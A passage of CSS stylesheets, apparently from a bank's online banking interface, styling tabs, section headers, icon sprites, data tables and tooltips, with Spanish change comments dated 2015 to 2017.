div[id="spnt.tabdivs.admn"] > .utilWnd > .utilBody > div > .mainOperations > div div.mainOperations{
	left: 0 !important;
    width: 100% !important;
}
*/

    div[id="spnt.tabdivs.pgs"]>.utilWnd>.utilBody>div>.mainOperations,
    div[id="spnt.tabdivs.tran"]>.utilWnd>.utilBody>div>.mainOperations,
    div[id="spnt.tabdivs.inve"]>.utilWnd>.utilBody>div>.mainOperations,
    div[id="spnt.tabdivs.dire"]>.utilWnd>.utilBody>div>.mainOperations,
    div[id="spnt.tabdivs.bpriv"]>.utilWnd>.utilBody>div>.mainOperations,
    div[id="spnt.tabdivs.admn"]>.utilWnd>.utilBody>div>.mainOperations{
        border:0px !important;
        border-style:none !important;
    }
    div[id="spnt.tabdivs.pgs"]>.utilWnd>.utilBody>div>.mainOperations>div.caja-header,
    div[id="spnt.tabdivs.tran"]>.utilWnd>.utilBody>div>.mainOperations>div.caja-header,
    div[id="spnt.tabdivs.inve"]>.utilWnd>.utilBody>div>.mainOperations>div.caja-header,
    div[id="spnt.tabdivs.dire"]>.utilWnd>.utilBody>div>.mainOperations>div.caja-header,
    div[id="spnt.tabdivs.bpriv"]>.utilWnd>.utilBody>div>.mainOperations>div.caja-header,
    div[id="spnt.tabdivs.admn"]>.utilWnd>.utilBody>div>.mainOperations>div.caja-header{
        background-color: #FF0000 !important;
        color: #FFF !important;
        height:24px !important;
    }
    div[id="spnt.tabdivs.pgs"]>.utilWnd>.utilBody>div>.mainOperations>div>div.mainOperations>div.caja-header,
    div[id="spnt.tabdivs.tran"]>.utilWnd>.utilBody>div>.mainOperations>div>div.mainOperations>div.caja-header,
    div[id="spnt.tabdivs.inve"]>.utilWnd>.utilBody>div>.mainOperations>div>div.mainOperations>div.caja-header,
    div[id="spnt.tabdivs.dire"]>.utilWnd>.utilBody>div>.mainOperations>div div.mainOperations>div.caja-header,
    div[id="spnt.tabdivs.bpriv"]>.utilWnd>.utilBody>div>.mainOperations>div>div.mainOperations>div.caja-header,
    div[id="spnt.tabdivs.admn"]>.utilWnd>.utilBody>div>.mainOperations>div div.mainOperations>div.caja-header{
        color: #6f6f6f !important;
    }

    div[id="spnt.tabdivs.pgs"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations,
    div[id="spnt.tabdivs.tran"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations,
    div[id="spnt.tabdivs.inve"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations,
    div[id="spnt.tabdivs.dire"]>.utilWnd>.utilBody>div>.mainOperations>div .mainOperations,
    div[id="spnt.tabdivs.bpriv"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations,
    div[id="spnt.tabdivs.admn"]>.utilWnd>.utilBody>div>.mainOperations>div .mainOperations{
        border: solid 1px #efeff1 !important;
        width: 100% !important;
        position:initial !important;
        left:0px !important;
    }
    div[id="spnt.tabdivs.pgs"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>.caja-header,
    div[id="spnt.tabdivs.tran"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations.caja-header,
    div[id="spnt.tabdivs.inve"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations.caja-header,
    div[id="spnt.tabdivs.dire"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations.caja-header,
    div[id="spnt.tabdivs.bpriv"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations.caja-header,
    div[id="spnt.tabdivs.admn"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations.caja-header{
        color:#6F6F6F !important;
        font-family: Verdana !important;
    }

    div[id="spnt.tabdivs.pgs"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData tr>td.class>a,
    div[id="spnt.tabdivs.tran"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData tr>td.class>a,
    div[id="spnt.tabdivs.inve"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData tr>td.class>a,
    div[id="spnt.tabdivs.dire"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData tr>td.class>a,
    div[id="spnt.tabdivs.bpriv"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData tr>td.class>a,
    div[id="spnt.tabdivs.admn"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData tr>td.class>a{
        color:#6F6F6F !important;
        font-size:11px !important;
        font-family: Verdana !important;
        font-weight:700;
        text-decoration: none !important;
    }
    div[id="spnt.tabdivs.pgs"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData,
    div[id="spnt.tabdivs.tran"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData,
    div[id="spnt.tabdivs.inve"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData,
    div[id="spnt.tabdivs.dire"]>.utilWnd>.utilBody>div>.mainOperations>div .mainOperations>div>table.confirmData,
    div[id="spnt.tabdivs.bpriv"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData,
    div[id="spnt.tabdivs.admn"]>.utilWnd>.utilBody>div>.mainOperations>div .mainOperations>div>table.confirmData{
        margin: 10px 0px !important;
    }
    div[id="spnt.tabdivs.pgs"]>.utilWnd>.utilBody>div>.mainOperations>div.caja-header>font,
    div[id="spnt.tabdivs.tran"]>.utilWnd>.utilBody>div>.mainOperations>div.caja-header>font,
    div[id="spnt.tabdivs.inve"]>.utilWnd>.utilBody>div>.mainOperations>div.caja-header>font,
    div[id="spnt.tabdivs.dire"]>.utilWnd>.utilBody>div>.mainOperations>div.caja-header>font,
    div[id="spnt.tabdivs.bpriv"]>.utilWnd>.utilBody>div>.mainOperations>div.caja-header>font,
    div[id="spnt.tabdivs.admn"]>.utilWnd>.utilBody>div>.mainOperations>div.caja-header>font{
        font-family: Verdana !important;
        font-size: 14px !important;
        top: 3px !important;
    }

    /*Clase generada por Indra SAA 01/07/2015 >> Adición de íconos a las secciones*/
    /*Flechas en circulo*/
    div[id="pagosPagos.UtilCajaColapHeader"],
    div[id="transferenciasTransferencias.UtilCajaColapHeader"],
    div[id="dirServTransferencias.UtilCajaColapHeader"],
    div[id="dirServPagos.UtilCajaColapHeader"]{
        background-image: url("./img/sprite-icons-misc.gif");
        background-position: 5px -634px;
        background-repeat: no-repeat !important;
    }
    /*Programadas Icon*/
    div[id="pagosOperaciones Programadas.UtilCajaColapHeader"],
    div[id="transferenciasOperaciones Programadas.UtilCajaColapHeader"],
    div[id="dirServOperaciones Programadas.UtilCajaColapHeader"]{
        background-image: url("./img/sprite-icons-misc.gif");
        background-position: 5px -719px;
        background-repeat: no-repeat !important;
    }
    /*Inversiones Icon*/
    div[id="dirServInversiones.UtilCajaColapHeader"],
    div[id="inversionesInversiones.UtilCajaColapHeader"],
    div[id="servrelPagosEstados de Cuenta.UtilCajaColapHeader"],
    div[id="dirServEstados de Cuenta.UtilCajaColapHeader"]{
        background-image: url("./img/sprite-icons-misc.gif");
        background-position: 5px -513px;
        background-repeat: no-repeat !important;
    }
    /*Consultas*/
    div[id="servrelPagosConsultas.UtilCajaColapHeader"],
    div[id="servrelTransferenciasConsultas.UtilCajaColapHeader"],
    div[id="servrelInversionesConsultas.UtilCajaColapHeader"],
    div[id="bpOpRelConsultas.UtilCajaColapHeader"],
    div[id="dirServConsultas.UtilCajaColapHeader"]{
        background-image: url("./img/sprite-icons-misc.gif");
        background-position: 5px -595px;
        background-repeat: no-repeat !important;
    }
    /*Configuración Icon*/
    div[id="admonAdministración de Cuentas.UtilCajaColapHeader"],
    div[id="admonAdministración de Seguridad.UtilCajaColapHeader"],
    div[id="admonAdministración de Datos.UtilCajaColapHeader"]
    div[id="admonAdministración de Aclaraciones.UtilCajaColapHeader"]{
        background-image: url("./img/sprite-icons-misc.gif");
        background-position: 5px -675px;
        background-repeat: no-repeat !important;
    }
    /*Actualización de datos*/
    div[id="servrelTransferenciasActualización de Datos.UtilCajaColapHeader"],
    div[id="servrelPagosActualización de Datos.UtilCajaColapHeader"],
    div[id="dirServActualización de Datos.UtilCajaColapHeader"]{
        background-image: url("./img/sprite-icons-misc.gif");
        background-position: 5px -395px;
        background-repeat: no-repeat !important;
    }
    /*Altas Icon*/
    div[id="servrelTransferenciasAlta / Registro.UtilCajaColapHeader"],
    div[id="servrelPagosAlta / Registro.UtilCajaColapHeader"],
    div[id="dirServAlta / Registro.UtilCajaColapHeader"]{
        background-image: url("./img/sprite-icons-misc.gif");
        background-position: 5px -758px;
        background-repeat: no-repeat !important;
    }
    /*Bajas Icon*/
    div[id="servrelTransferenciasBajas.UtilCajaColapHeader"],
    div[id="servrelPagosBajas.UtilCajaColapHeader"],
    div[id="dirServBajas.UtilCajaColapHeader"]{
        background-image: url("./img/sprite-icons-misc.gif");
        background-position: 5px -796px;
        background-repeat: no-repeat !important;
    }
    /*Seguridad Icon*/
    div[id="dirServSeguridad.UtilCajaColapHeader"]{
        background-image: url("./img/sprite-icons-misc.gif");
        background-position: 5px -555px;
        background-repeat: no-repeat !important;
    }
    /*Solicitudes Tag Icon*/
    div[id="dirServSolicitudes.UtilCajaColapHeader"]{
        background-image: url("./img/sprite-icons-misc.gif");
        background-repeat: no-repeat;
        background-position: 5px -837px;
    }

    /*Activaciones check Icon*/
    div[id="dirServActivaciones.UtilCajaColapHeader"],div[id="servrelPagosActivaciones.UtilCajaColapHeader"]{
        background-image: url("./img/sprite-icons-misc.gif");
        background-repeat: no-repeat;
        background-position: 5px -1034px;
    }
    div[id="admnSegur.UtilCajaColapBody"]>div .caja-header{
        background-image: url("./img/sprite-icons-misc.gif");
        background-position: 5px -675px;
        background-repeat: no-repeat !important;
    }

    /*Finaliza*/

    div.mainOperations{
        left: 10px !important;
        width: calc(100% - 20px) !important;
    }
    /*Finaliza*/
    table.table-header td{
        padding: 0px;
        padding-left: 10px;
        padding-right: 10px;
        font-weight: bold;
    }
    td.td-header{
        border: solid 1px;
        border-color:  #BDBDBD;
        font-size: 11px;
        cellspacing: 0px;
        cellpadding: 0px;
    }
    #toolTipBox {
        display: none;
        padding: 5px;
        font-size: 11px;
        border: black solid 1px;
        font-family: Verdana;
        position: 110px,70px;
        z-index:100;
        background-color: #FFFF80;
        color: #000000;
    }

    #enroll_STU{
        background-image:url(./img/fondoSTU.gif);
    }

    #enroll_STU input{
        border:1px solid #09C;
        height:20px;
        font-size:11px;
        padding:3px;
        color:#444;
        width:135px !important;
    }

    .btn_stu{
        float: right;
        text-decoration:none;
        margin-left:20px;

    }
    .btn_stu span{
        /*background-image:url(./img/btn_stu.jpg);*/
        background:#FFFFFF !important;
        box-shadow:5px 5px 5px rgba(64,64,64,0.3);
        color:#FF0000;

        cursor: pointer;
        width:115px;
        height:27px;
        text-decoration:none;
        /*color:#333;*/
        display:block;
        line-height:27px;
        text-align:center;
        font-size:13px;
    }

    .txt_stu{
        font-family:Verdana;
        color:#444;
    }

    .frase_stu{
        display: block;
        margin: 0 auto;
        text-align: center;
        font-family:Verdana;
        font-weight: bold;
    }

    #aToolTip_STU {
        background-image:url(./img/tool_s1.png);
        border:1px solid #999;
        color: #666666;
        text-align: justify;
    }

    .txt_aToolTip_STU{
        font-family:Verdana;
        color:#666;
    }

    .aToolTipCloseBtn {
        display:block;
        height:20px;
        width:20px;
        background: url(./img/tool_x.gif) no-repeat;
        text-indent:-9999px;
        outline:none;
    }
    /*Creada por Indra SAA 16/07/2015 >> Estilo pára compra / venta de fondos de inversion */
    #selectCuenta{
        top: 2px !important;
    }
    #divMain{
        background-color:#FFF !important;
    }
    #lblImporte{

    }
    input[id="fniv.txtImporte"]{

    }
    button[id="fniv.consultar"]{
        left: 684px !important;
        width:89px !important;
    }
    .banner123{
        display:block;
        color:#666666;
        text-align: center;
        font-family:Verdana, Geneva, sans-serif;
        font-weight:normal;
        font-size:x-small;
    }
</style>
<style>div.mainOperation
    {
        border-width: 1px;
        border-color: #FF0000;
        background-color: #F1F1F1;
    }

    div.win_bckg
    {
        background-color: transparent !important;
        border-style:solid;
        border-width: 1px;
        border-color: transparent; /*#D6D7DB;*/
        border-top-width: 0px;


    }
    div.mainWin
    {
        background-color: #FFFFFF;
        border-style:solid;
        border-width: 1px;
        border-color: rgba(64,64,64,0.7);
        border-top:0px;

    }
    .header
    {
        font-size: 12px;
        font-weight: bold;
        color: #FFFFFF;
    }
    .header2
    {
        font-size: 13px;
        font-weight: bold;
    }
    .header3
    {
        font-size: 13px;
    }
    .header4
    {
        color: #FFFFFF;
        font-size: 11px;

    }
    .linked
    {
        cursor:pointer;
    }

    .size
    {
        font-size: 11px;
        white-space:normal;

    }

    .sizeNotesBox
    {
        font-size: 11px;
        white-space:normal;

    }


    select
    {
        font-size: 11px;

    }
    /*Modificación de clase Indra SAA  26/06/2015 >> Modifica el color de fondo de la sección saldos consolidados del modulo mi SuperNet*/
    div.mainOperations
    {
        background-color: #FFF;
        border-width: 1px;
        border-color: #EFEFF1;
        margin-bottom:6px;
    }
    div.mainOperations > div > table{
        width:100% !important;
        border-spacing:0px ;
    }
    /*Indra SAA 08/07/2015 >> Tamaño de texto para link modulos supernet*/
    div[id="spnt.tabdivs.pgs"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td>a,
    div[id="spnt.tabdivs.tran"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td>a,
    div[id="spnt.tabdivs.inve"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td>a,
    div[id="spnt.tabdivs.bpriv"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td>a,
    div[id="spnt.tabdivs.dire"]>.utilWnd>.utilBody>div>.mainOperations>div .mainOperations>div>table.confirmData>tbody>tr>td>a,
    div[id="spnt.tabdivs.admn"]>.utilWnd>.utilBody>div>.mainOperations>div .mainOperations>div>table.confirmData>tbody>tr>td>a{
        color: #6F6F6F !important;
        font-family: Verdana !important;
        font-size: 11px;
        text-decoration: none !important;
    }
    div[id="spnt.tabdivs.pgs"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td[colspan="2"],
    div[id="spnt.tabdivs.tran"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td[colspan="2"],
    div[id="spnt.tabdivs.inve"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td[colspan="2"],
    div[id="spnt.tabdivs.bpriv"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td[colspan="2"],
    div[id="spnt.tabdivs.dire"]>.utilWnd>.utilBody>div>.mainOperations>div .mainOperations>div>table.confirmData>tbody>tr>td[colspan="2"],
    div[id="spnt.tabdivs.admn"]>.utilWnd>.utilBody>div>.mainOperations>div .mainOperations>div>table.confirmData>tbody>tr>td[colspan="2"]{
        background-image: none;
        padding: 2px !important;
    }
    div[id="spnt.tabdivs.pgs"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td[colspan="2"]:hover,
    div[id="spnt.tabdivs.tran"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td[colspan="2"]:hover,
    div[id="spnt.tabdivs.inve"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td[colspan="2"]:hover,
    div[id="spnt.tabdivs.bpriv"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td[colspan="2"]:hover,
    div[id="spnt.tabdivs.dire"]>.utilWnd>.utilBody>div>.mainOperations>div .mainOperations>div>table.confirmData>tbody>tr>td[colspan="2"]:hover,
    div[id="spnt.tabdivs.admn"]>.utilWnd>.utilBody>div>.mainOperations>div .mainOperations>div>table.confirmData>tbody>tr>td[colspan="2"]:hover{
        background-image: none;
    }

    div[id="spnt.tabdivs.pgs"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td,
    div[id="spnt.tabdivs.tran"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td,
    div[id="spnt.tabdivs.inve"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td,
    div[id="spnt.tabdivs.bpriv"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td,
    div[id="spnt.tabdivs.dire"]>.utilWnd>.utilBody>div>.mainOperations>div .mainOperations>div>table.confirmData>tbody>tr>td,
    div[id="spnt.tabdivs.admn"]>.utilWnd>.utilBody>div>.mainOperations>div .mainOperations>div>table.confirmData>tbody>tr>td{
        padding:2px !important;
        background-image: url(./img/icon-list-inactive.gif);
        background-position: 13px center;
        background-repeat:no-repeat;
        padding-left:35px !important;
    }
    div[id="spnt.tabdivs.pgs"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td:hover,
    div[id="spnt.tabdivs.tran"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td:hover,
    div[id="spnt.tabdivs.inve"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td:hover,
    div[id="spnt.tabdivs.bpriv"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td:hover,
    div[id="spnt.tabdivs.dire"]>.utilWnd>.utilBody>div>.mainOperations>div .mainOperations>div>table.confirmData>tbody>tr>td:hover,
    div[id="spnt.tabdivs.admn"]>.utilWnd>.utilBody>div>.mainOperations>div .mainOperations>div>table.confirmData>tbody>tr>td:hover{
        background-image: url(./img/list-icon-active.gif);
    }
    div[id="spnt.tabdivs.pgs"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td.all,
    div[id="spnt.tabdivs.tran"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td.all,
    div[id="spnt.tabdivs.inve"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td.all,
    div[id="spnt.tabdivs.bpriv"]>.utilWnd>.utilBody>div>.mainOperations>div>.mainOperations>div>table.confirmData>tbody>tr>td.all,
    div[id="spnt.tabdivs.dire"]>.utilWnd>.utilBody>div>.mainOperations>div .mainOperations>div>table.confirmData>tbody>tr>td.all,
    div[id="spnt.tabdivs.admn"]>.utilWnd>.utilBody>div>.mainOperations>div .mainOperations>div>table.confirmData>tbody>tr>td.all{
        width:30px !important;
        display:none;
    }

    /*Finaliza*/


    div.mainOperations>div>table>tbody>tr>td{
        padding:0px !important;
    }
    tr.headerSldCons td{
        padding:5px 3px !important;
    }

    div.header
    {
        background-color: #7a7f85;
    }
    div.headerIn
    {
        border-top-style:solid;
        border-top-width: 1px;
        border-top-color: #FFFFFF;
        border-bottom-style:solid;
        border-bottom-width: 1px;
        border-bottom-color: #FFFFFF;
    }

    div.endOPRP
    {

        border-bottom-style:solid;
        border-bottom-width: 1px;
        border-bottom-color: #BDBDBD;
    }

    div.spnt-sombra {

        background-image: url(./img/spnt-oprp-sombra.gif);

        background-repeat: repeat-x;

    }
    a.item, a.item:visited.lnk, a.item:hover.lnk, a.item:link{
        font-family: Verdana;
        color: #0000ff;
        font-size: 11px;

    }</style>
<style>/** Definici�n global para fuentes de movimientos */
    font.mvts, font.pagerLink {
        font-size: 11px;
        font-family: Verdana;
        font-weight: normal;
    }

    font.headerTitle font.mvts {
        float:left;
        position:relative;
    }

    font.all, input.allUpp {
        font-size: 12px;
        font-family: Verdana;
        font-weight: normal;
    }

    a {
        font-size: 12px;
        font-family: Verdana;
        font-weight: normal;
    }
    input.allUpp {
        text-transform:uppercase;
    }

    tr.all td {
        font-size: 12px;
        font-family: Verdana;
        font-weight: normal;
    }


    /** Contenedor del t�tulo del m�dulo */
    /*Classe modificada por Indra SAA para Look & Feel SuperNet 22/06/2015*/
    div.title {
        background: #84878C;
        background:#FFFFFF;
        font-size: 12px;
        top:0px !important;
        left:0px !important;
        width:100% !important;
    }

    /** Sub-contenedor del t�tulo del m�dulo. Incluye el texto
	y un par de lineas (arriba y abajo) para lograr
	el formato.
 */
    div.inTitle {
        /*Classe modificada por Indra SAA para Look & Feel SuperNet 22/06/2015 >> Modificaci�n de color de borde superior Rojo para ventanas modales estructura de divs*/
        /*border-top-style:solid;
border-top-width: 1px;
border-top-color: #E5E8E8;
border-bottom-style:solid;
border-bottom-width: 1px;
border-bottom-color: #E5E8E8;*/
        font-size: 12px;
        color: #FF0000;
        font-weight: bold;
        background-color:#FFF;
        border-top:5px solid #FF0000 !important;
        border-bottom:0px !important;

        top:0px !important;
        left:0px !important;
    }

    div.inTitle font.mvts {
        font-size: 11px;
        color: white;
        font-weight: bold;

    }

    /** Contenedor del subtitulo del m�dulo **/
    div.subtitle {
        border-top-style:solid;
        border-top-width: 0px;
        border-top-color: #A0A0A4;
        border-bottom-style:solid;
        border-bottom-width: 0px;
        border-bottom-color: silver;
        background: #E9E9E9;
    }

    /** Sub-contenedor. Incluye el texto y la imagen
    de fondo con la que se logra el efecto de sombra
*/
    div.inSubtitle {
        font-family: Verdana;
        font-size: 12px;
        color: black;
        font-weight: bold;
        /*background-image: url("./img/barra_cuentas_fillAux.gif");*/
        background-repeat: repeat-x;
    }

    /**
  * Contenedor principal del material del m�dulo
  */
    div.main {
        background: #F4F5F9;
        border: 2px solid #D6D7DB;
        border-top-width: 0px;
        font-family: Verdana;
        font-size: 12px;
        color: black;
        font-weight: bold;
    }

    div.mainModal {
        background: #F4F5F9;
        border-top-width: 0px;
        font-family: Verdana;
        font-size: 12px;
        color: black;
        font-weight: bold;
    }

    /**
 * Formato para los datos de la cuenta que se est�
 * consultando
 */
    font.infoAccount {
        font-family: Verdana;
        font-size: 12px;
        color: black;
        font-weight: normal;
    }
    /**
 * Formato simple para ligas. REEMPLAZAR por formato correcto.
 */
    font.linkunder , font.link{
        font-weight: normal;
        font-size: 12px;
    }

    /**
 * Contenedor que aloja tanto los filtros de la tabla
 * como la tabla misma.
 */
    div.filters {
        /*Modificacion Indra SAA >> Color de fondo transparente*/
        background:transparent;
        /*background: #F4F5F9;*/
        border: 1px solid #CCCCCC;
        font-weight: normal;
        font-size: 12px;
    }

    /*
 * Sub contenedor que aloja los filtros disponibles.
 */
    div.inFilters {
        /*Modificacion Indra SAA 09/07/2015 >> Color de fondo blanco*/
        background: #FFF;
        /*background: #F4F5F9;*/
        border-bottom: 1px solid #CCCCCC;
        font-weight: normal;
        font-size: 12px;
    }

    /**
 * Contenedor que aloja la tabla de datos
 */
    div.table {
        background: #F4F5F9;
        font-weight: normal;
        font-size: 12px;
    }

    table.pTable td{
        padding: 0px;
        padding-left: 10px;
        padding-right: 10px;
        text-align:center;
    }

    /*Modificacion Indra SAA >> Modificacion tabla de ultimos 5 movimientos*/
    table.eTable td{
        padding: 0px;
        /*padding-left: 10px;*/
        padding-right: 10px;
    }

    /**
 * Renglon blanco de la tabla
 */
    tr.white td{

        background: white;
        height: 17px;
    }

    tr.whiteTC td{

        background: white;
        height: 17px;
        padding-right: 5px;
        padding-left: 5px;
        text-align: justify;

    }

    /**
 * Renglon amarillo claro de la tabla
 */
    tr.yellow td{
        /*Modificaci�n a clase Indra SAA 26/06/2015 >> cambio de estilo a grids eliminaci�n del variant para fila*/
        /*background:#FBFBD8;*/
        height: 17px;
    }

    /**
 * Renglon gris de la tabla
 */
    tr.gray td{
        /*Modificaci�n a clase ISBAN EDRQ 19/06/2017 >> Homologaci�n de conceptos - variant para fila*/
        background:#A9A9A9;
        height: 17px;
    }

    /**
 * Renglon amarillo claro de la tabla
 */
    tr.yellowTC td{
        background:#FBFBD8;
        height: 17px;
        padding-right: 5px;
        padding-left: 5px;
        text-align: justify;
    }

    /** Renglon que contiene los encabezados de la
  * tabla
  */
    tr.tableHeadingScroll td,tr.tableHeadingScrollEC td{
        font-weight: bold;
        background: #F4F5F9;
        height: 30px;
        border-bottom: 1px solid #CCCCCC;
        border-top: none;
        border-right: none;
        border-left: none;
        top: expression(document.getElementById("divTable").scrollTop-2);
        z-index:20;
        position:relative;
        white-space:nowrap;
    }

    /* Estilo para dar salto de linea en encabezados en Detalle Dinero Creciente*/
    tr.tableHeadingScrollDC td,tr.tableHeadingScrollDC td{
        font-weight: bold;
        background: #F4F5F9;
        height: 30px;
        border-bottom: 1px solid #CCCCCC;
        border-top: none;
        border-right: none;
        border-left: none;
        top: expression(document.getElementById("divTable").scrollTop-2);
        z-index:20;
        position:relative;
        white-space: normal;

    }

    tr.tableHeadingScrollEC td{top: expression(document.getElementById("edct.divTable").scrollTop-2);}
    /*Modificaci�n Indra SAA 09/07/2015 >> Modificaci�n Ultimos 5 movimientos*/
    tr.tableHeading td{
        font-weight: bold;
        font-size: 11px;
        background: #F1F1F1;
        height: 30px;
        border-bottom: 1px solid #CCCCCC;
        border-top: none;
        border-right: none;
        border-left: none;
        white-space:nowrap;

    }
    select {
        font-weight: normal;
    }


    /**
 * Estilo para las cajas de operaciones relacionadas
 * y servicios relacionados a la cuenta
 */
    div.rel{
        background: transparent;
        /*border: 1px solid #CCCCCC;*/
        font-weight: normal;
    }
    div.rel > font{
        font-size: 11px !important;
        color: #333333;
        padding-left: 25px;
        text-decoration: none;

        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
        width:360px;
    }
    /**
 * Formato para el encabezado de los filtros
 * (Periodo de b�squeda, B�squeda espec�fica)
 */
    /*Modificacion Indra SAA 09/07/2015 >> Edicion para estilos Bitacora de operaciones*/
    div.filterHeading{
        font-family: Verdana;
        font-size: 12px;
        color: black;
        font-weight: bold;
        background: #F1F1F1;
    }

    /**
 * Estilo del contenedor del paginador
 */
    div.pager, div.pagerWin {
        border-top: 1px solid #CCCCCC;
        background: #F4F5F9;
    }
    /**
 * Paginador para tablas en ventanas modales
 */
    div.pagerWin {
        border-bottom: 1px solid #CCCCCC;
    }

    /**
 * Utilizada para especificar notas en letra peque�a (**)
 */
    font.note{
        font-family: Verdana;
        font-size: 9px;
        font-weight: normal;
    }

    /**
 * Da estilo al frame que ir� dentro de la ventana modal
 */

    div.frame {
        background: #F4F5F9;
        border: 1px solid #CCCCCC;
        font-weight: normal;
        font-size: 12px;
    }

    div.tableFrame {
        border: 1px solid #CCCCCC;
    }

    tr.whiteLarge td{

        background: white;
        height: 30px;

    }

    tr.yellowLarge td{

        background: #FBFBD8;
        height: 30px;

    }

    #c_checkbox {
        top: 5px;
        position: relative;
    }

    hr {
        color: #C7C9D4;
        background-color: #C7C9D4;
        height: 2px;
    }

    div.stepBar{
        background: #D2D2DC;
    }

    div.tags {
        background: #D6E2F0;
        font-weight: normal;
        font-size: 12px;
    }

    div.wizContent{
        background: #F4F5F9;
    }

    tr.tagSelected td{
        background: #F4F5F9;
        font-weight: bold;
    }

    table.tagTable {
        padding: 10px;
    }
    tr.tagUnselected td{
        background: #D6E2F0;
        font-weight: normal;
    }

    table.saldos {
        padding-left: 5px;
        padding-right: 5px;
    }

    font.pagerLink {
        cursor:pointer;
    }

    div.colapGray {
        background: #F4F5F9;
    }

    /**
* Da estilo a los formularios de aclaraciones
*
*/
    /********marlong******
span.entrada font, table.form td,font.subTitulo
{
	font-family: Verdana;
	font-size: 12px;
}
span.entrada #lblIndice,td.msgReq, font.subTitulo
{
        font-weight: bold;
}

span.entrada #lblComent
{
        font-size: 11px;
}

table.oper td
{
        text-align:center;
}

.oper
{
        background-color:#EEEEEC;
}

div.finTable {
	border-bottom: 1px solid #CCCCCC;
	border-top: none;
	border-right: none;
	border-left: none;
}
tr.nowrap {
        text-align:center;
        white-space:nowrap;
}
/*** marlong ***/


    div.oper
    {
        background-color:#E0E0EA;
    }

    tr.nowrap {
        white-space:nowrap;
        text-align:center;
    }

    tr.tbHeaderMsg td {
        font-weight: bold;
        font-size: 12px;
        background: #F4F5F9;
        height: 30px;
        border-bottom: 1px solid #CCCCCC;
        border-top: none;
        border-right: none;
        border-left: none;
        white-space:nowrap;
        text-align: center;
    }

    tr.yellowMsg td {
        background:#FBFBD8;
        height: 17px;
        white-space:nowrap;
        text-align: center;
    }

    tr.whiteMsg td {
        background:#FFFFFF;
        height: 17px;
        text-align: center;
        white-space:nowrap;
    }

    div.msgDatos{
        border-bottom: none;
        border-top: none;
        border-right: none;
        border-left: 3px solid #CCCCCC;
    }
    /*Edici�n de clase Indra SAA >> Modificaci�n de los fieldsets para Bitacora de operaciones*/
    Fieldset.notas{
        -moz-border-radius: 3px;
        border-radius: 3px;
        border-width:1px;
        border-color:rgb(64,64,64);
    }
    Fieldset.notas legend{
        color:black;
    }
    /*****19/07/2007****/
    .divRight{
        text-align:right;
    }

    .lblAccion{
        text-align:center;
    }

    .notifMsg{
        border: 1px solid #E0E0EA;
        background-color:white;
        padding:5px;
    }
    /*****19/07/2007****/

    /*****20/07/2007****/
    .sizeInput{
        font-size: 12px;
        width: 300px;
    }
    .ocultar
    {
        display:none;
    }
    .margenCtas
    {
        padding-right:20px;
        padding-left:25px;
        padding-top:24px;
        padding-bottom:24px;
    }

    .size400
    {
        font-size: 11px;
        width: 400px;
    }

    .size250{
        font-size: 11px;
        width: 250px;
    }

    .size290{
        font-size: 11px;
        width: 290px;
    }
    /*****20/07/2007****/

    /********marlong******/

    /********rodrigogarcia******/
